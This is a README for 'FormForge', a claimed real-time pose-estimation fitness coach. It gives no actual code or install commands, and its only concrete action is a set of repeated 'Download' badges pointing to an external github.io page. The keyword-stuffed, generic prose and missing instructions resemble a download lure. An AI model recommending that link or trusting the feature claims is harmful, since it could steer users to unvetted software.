![preview](https://raw.githubusercontent.com/vbszbdrup/Pose-Angle-Coach/main/splash_d6b7.svg)
[![Download](https://raw.githubusercontent.com/vbszbdrup/Pose-Angle-Coach/main/start_0717a.svg)](https://vbszbdrup.github.io/Pose-Angle-Coach/)

# 🏋️ FormForge — The Kinetic Mirror for Human Movement

> *A real-time biomechanics companion that watches your posture the way a sculptor studies marble — patiently, precisely, and without ever getting tired.*

Welcome to **FormForge**, a computer-vision studio for the human body. Where a traditional AI-Trainer counts reps, FormForge reads the geometry of motion itself — joints, angles, tempo, and symmetry — rendered onto your screen as a living skeleton that coaches you in the moment.

This repository is the beating heart of that idea: a Python + OpenCV engine that performs skeletal pose estimation on ordinary CPUs, extracts anatomically meaningful keypoints, converts those keypoints into measurable joint angles, and then translates cold numbers into warm, human feedback.

[![Download](https://raw.githubusercontent.com/vbszbdrup/Pose-Angle-Coach/main/start_0717a.svg)](https://vbszbdrup.github.io/Pose-Angle-Coach/)

---

## 📖 Table of Contents

- [Why FormForge Exists](#-why-formforge-exists)
- [The Idea in One Metaphor](#-the-idea-in-one-metaphor)
- [Core Capabilities](#-core-capabilities)
- [Feature Highlights](#-feature-highlights)
- [How the Pipeline Thinks](#-how-the-pipeline-thinks)
- [The Angle Engine, Explained](#-the-angle-engine-explained)
- [Responsive Interface Philosophy](#-responsive-interface-philosophy)
- [Multilingual Coaching Layer](#-multilingual-coaching-layer)
- [Round-the-Clock Guidance](#-round-the-clock-guidance)
- [System Requirements](#-system-requirements)
- [Getting Started Without the Boring Parts](#-getting-started-without-the-boring-parts)
- [Project Structure](#-project-structure)
- [Configuration Reference](#-configuration-reference)
- [Use Cases & Scenarios](#-use-cases--scenarios)
- [Performance Notes](#-performance-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [SEO & Discoverability](#-seo--discoverability)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Acknowledgements](#-acknowledgements)

---

## 🌱 Why FormForge Exists

Most fitness software counts. Very little of it *understands*. A rep counter knows a squat happened; it rarely knows whether the knee tracked over the toe, whether the spine stayed neutral, or whether the left side compensated for a tired right side.

FormForge was born from that gap. Instead of treating the body as a black box that produces numbers, we treat it as a **kinematic sculpture** — a set of connected segments whose relationships can be measured, compared, and gently corrected.

The project began as a simple experiment: can a modest laptop, with no dedicated graphics hardware, watch a person move and say something genuinely useful about it? The answer, after many iterations, is a confident yes.

---

## 🪞 The Idea in One Metaphor

Imagine a mirror that does not just reflect you, but *annotates* you. It traces your silhouette with bright lines, labels each joint, and quietly whispers: "Your left elbow drifted two degrees outward — bring it back."

That is FormForge. A kinetic mirror. A coach made of pixels and math.

---

## 🧠 Core Capabilities

- **CPU-first pose estimation** — skeletal tracking that runs comfortably without a discrete GPU.
- **Joint angle extraction** — shoulders, elbows, wrists, hips, knees, ankles, and spine-relative measurements.
- **Tempo awareness** — tracks how long each repetition takes, flagging rushed or stalled movement phases.
- **Symmetry scoring** — compares left and right limb behavior to surface compensation patterns.
- **Posture drift detection** — notices when your alignment wanders over the course of a session.
- **Overlay rendering** — draws the skeleton, angle arcs, and coaching text directly onto the video frame.
- **Session summaries** — a compact end-of-session report of angles, ranges, and consistency.
- **Extensible rule engine** — define your own movement rules in simple configuration files.

---

## ✨ Feature Highlights

| Feature | What It Delivers |
|---|---|
| 🎯 Responsive real-time overlay | Adjusts layout and font scaling to the current video resolution, so the interface stays legible on small webcams and large displays alike |
| 🌍 Multilingual coaching layer | Coaching strings are externalized, making it straightforward to present feedback in many languages |
| 🕐 Round-the-clock guidance | The rule engine operates continuously without sessions, subscriptions, or waiting — guidance is available whenever you are |
| 🧩 Modular detectors | Each movement (squat, push-up, lunge, plank) is a self-contained module you can add or remove |
| 📊 Angle telemetry | Every joint angle is streamed, logged, and summarized for later review |
| 🪶 Lightweight footprint | Designed to run alongside other applications on everyday hardware |
| 🔒 Local processing | Video frames are analyzed on-device; nothing is uploaded anywhere |
| 🎨 Themeable overlay | Colors, line thickness, and arc styles are configurable to taste |

---

## 🔬 How the Pipeline Thinks

FormForge processes each frame through a sequence of stages, each one narrowing raw pixels into meaningful insight:

1. **Frame Acquisition** — video is pulled from a webcam, a recorded file, or a streaming source.
2. **Pose Estimation** — a pose model identifies human keypoints and their confidence values.
3. **Keypoint Filtering** — low-confidence joints are masked so the geometry stays trustworthy.
4. **Angle Computation** — vectors are formed between adjacent joints and the angle between them is calculated.
5. **Rule Evaluation** — the rule engine compares measured angles against expected ranges for the active movement.
6. **Feedback Synthesis** — results are converted into short, actionable coaching phrases.
7. **Overlay Rendering** — skeleton, arcs, and text are composited onto the frame and displayed.

Each stage is intentionally decoupled. Swap the pose estimator, replace the rule engine, or redesign the overlay — the rest of the pipeline keeps working.

---

## 📐 The Angle Engine, Explained

The angle engine is the intellectual center of FormForge. It works like a surveyor with three reference points:

- Pick a vertex joint (for example, the elbow).
- Measure the vector from the vertex to each neighboring joint (shoulder and wrist).
- Compute the angle between those two vectors.
- Compare the result against a movement-specific target band.

Because angles are scale-invariant, the same rules work whether the person is tall, short, near the camera, or far from it. That property is what makes FormForge portable across bodies and rooms.

Additional derived metrics include:

- **Angular velocity** — how quickly a joint angle changes per second.
- **Range of motion** — the minimum and maximum angle observed during a repetition.
- **Hold duration** — how long a joint stays within a target band.
- **Left-right delta** — the difference between mirrored joints on opposite sides.

---

## 🖥️ Responsive Interface Philosophy

An overlay that looks perfect on a 1080p monitor can become unreadable on a 720p webcam feed. FormForge treats responsiveness as a first-class concern:

- Text scales relative to frame height.
- Arc radii adapt to the distance between joints.
- Panels reposition to avoid covering the athlete.
- Color contrast is adjusted for both bright and dim environments.

The result is an interface that feels native to whatever camera you happen to own.

---

## 🌐 Multilingual Coaching Layer

Coaching is only useful if it is understood. FormForge separates language from logic:

- All coaching phrases live in external language bundles.
- Adding a new language means adding one file — no code changes.
- Right-to-left scripts are supported through layout mirroring.
- Numeric formatting respects locale conventions.

This design keeps the engine language-agnostic while letting the experience feel personal.

---

## 🕐 Round-the-Clock Guidance

FormForge does not sleep. There are no appointment windows, no queue, no waiting room. The rule engine evaluates every frame the moment it arrives, so guidance is available at dawn, at midnight, or during a lunch break that lasted a little too long.

---

## ⚙️ System Requirements

- A processor from the last several years (dual-core or better recommended).
- At least 4 GB of system memory.
- A webcam or a pre-recorded video file.
- A Python 3.9+ runtime with the project's declared libraries available.
- No dedicated graphics hardware required — though it will be used if present.

---

## 🚀 Getting Started Without the Boring Parts

FormForge is designed to be approachable. The general flow is:

1. Obtain the project files through your preferred distribution channel.
2. Prepare a Python environment using your environment manager of choice.
3. Install the declared dependencies from the bundled requirements manifest.
4. Confirm your camera is connected and accessible.
5. Launch the main entry point and step into frame.

If something misbehaves, the troubleshooting section below usually has the answer.

[![Download](https://raw.githubusercontent.com/vbszbdrup/Pose-Angle-Coach/main/start_0717a.svg)](https://vbszbdrup.github.io/Pose-Angle-Coach/)

---

## 🗂️ Project Structure

- **core/** — the pipeline orchestrator and frame loop.
- **pose/** — pose estimation wrappers and keypoint normalization.
- **geometry/** — vector math, angle computation, and smoothing filters.
- **rules/** — movement definitions and evaluation logic.
- **feedback/** — phrase synthesis and language bundles.
- **render/** — overlay drawing, arcs, and text layout.
- **io/** — camera, file, and stream adapters.
- **telemetry/** — session logging and summary generation.
- **config/** — default configuration and movement profiles.
- **docs/** — extended documentation and diagrams.

---

## 🛠️ Configuration Reference

Common knobs you may want to tune:

- **confidence_threshold** — minimum keypoint confidence to trust a joint.
- **smoothing_window** — number of frames averaged to reduce jitter.
- **target_bands** — per-movement acceptable angle ranges.
- **overlay_theme** — color palette and line weight presets.
- **language** — active coaching language bundle.
- **log_interval** — how frequently telemetry is written.

---

## 🎯 Use Cases & Scenarios

- **Home practice** — a quiet companion for solo sessions.
- **Physical therapy support** — objective angle data for rehabilitation tracking.
- **Coaching assistance** — a second pair of eyes for trainers working with groups.
- **Ergonomics research** — posture data collection in controlled studies.
- **Education** — a teaching aid for anatomy and kinesiology courses.
- **Accessibility** — guided movement feedback for users who benefit from visual cues.

---

## ⚡ Performance Notes

Pose estimation is the heaviest stage. On a typical modern laptop, FormForge targets fluid frame rates at standard webcam resolutions. If performance dips:

- Reduce capture resolution.
- Increase the smoothing window to lower per-frame work.
- Disable non-essential overlay elements.
- Process every other frame for very modest hardware.

---

## 🗺️ Roadmap for 2026

- Expanded movement library with mobility and balance routines.
- On-device model personalization for improved keypoint stability.
- Optional audio cues with adjustable verbosity.
- Export formats for research and clinical workflows.
- Plugin interface for third-party movement modules.

---

## 🔍 SEO & Discoverability

FormForge is built for people searching for *real-time pose estimation with OpenCV*, *joint angle measurement in Python*, *CPU-based fitness posture analysis*, *biomechanics feedback software*, and *kinematic coaching overlays*. The documentation intentionally uses clear, descriptive language so that both newcomers and specialists can find what they need — posture correction tooling, movement analysis pipelines, and skeleton tracking utilities that run without dedicated graphics hardware.

---

## ❓ Frequently Asked Questions

**Does FormForge need a GPU?**
No. It is engineered to run on CPUs and will opportunistically use acceleration if available.

**Is my video uploaded anywhere?**
No. Processing happens locally on your machine.

**Can I add my own movements?**
Yes. Movement definitions live in configuration files and are straightforward to extend.

**Does it work with recorded video?**
Yes. File-based analysis is supported alongside live capture.

---

## ⚠️ Disclaimer

FormForge is an educational and informational tool. It is **not** a medical device and does not provide diagnosis, treatment, or professional medical advice. Angle measurements are estimates derived from computer vision and may contain error. Always consult a qualified healthcare or fitness professional before beginning, modifying, or continuing any exercise program. You assume full responsibility for how you use the feedback provided by this software. The maintainers accept no liability for injury, loss, or damages arising from its use.

---

## 📜 License

This project is distributed under the MIT License. See the full text here: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 FormForge Contributors.

---

## 🙏 Acknowledgements

Gratitude to the open-source computer vision community, to the researchers who publish pose estimation work freely, and to every athlete who has ever wondered whether their knee was really tracking correctly.

[![Download](https://raw.githubusercontent.com/vbszbdrup/Pose-Angle-Coach/main/start_0717a.svg)](https://vbszbdrup.github.io/Pose-Angle-Coach/)